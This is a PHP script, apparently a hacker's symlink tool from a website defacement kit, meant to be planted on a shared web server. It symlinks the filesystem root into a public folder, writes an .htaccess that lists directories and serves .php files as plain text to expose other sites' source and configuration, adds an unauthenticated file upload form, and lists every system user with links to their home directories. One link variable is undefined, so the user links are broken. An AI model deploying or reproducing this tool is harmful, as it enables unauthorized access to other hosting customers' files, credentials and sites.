<?php
error_reporting(0);
if(!is_dir("defacer_sym")) {
    mkdir("defacer_sym");
}
symlink("/", "defacer_sym/root");
$hta="Options Indexes FollowSymLinks\nDirectoryIndex defacer\nAddType txt .php\nAddHandler txt .php\n";
$htaccess=fopen("defacer_sym/.htaccess", "w");
fwrite($htaccess, $hta);
fclose($htaccess);
?>
<title>PHP User & Directory Symlink</title>
<style>td { border: 1px solid black; }</style>
<center>
<font size="20">PHP User & Directory Symlink</font>
<hr>
<form enctype="multipart/form-data" method="post">
    <input type="file" name="upd"><input type="submit" name="up" value="Upload">
</form>
<?php
if($_POST['up']) {
    if(copy($_FILES['upd']['tmp_name'], $_FILES['upd']['name'])) {
        echo "<br><br>".$_FILES['upd']['name']." Uploaded !!!";
    }
}
?>
<hr>
<b>Symlink</b><br><br>
<table style="border: 1px solid black;" height="100%">
<tr><td>No</td><td>User</td><td>Symlik</td></tr>
<?php
$x=0;
for($i=0; $i < 100000; $i++) {
        $uid=posix_getpwuid($i);
        if(!empty($uid)) {
                $x++;
                echo "<tr><td>$x</td><td>$uid[name]</td><td><a href='defacer_sym/root/home/$user_x[0]'>Symlink</a></td>\n";
        }
}
echo "</table>";
?>
</center>
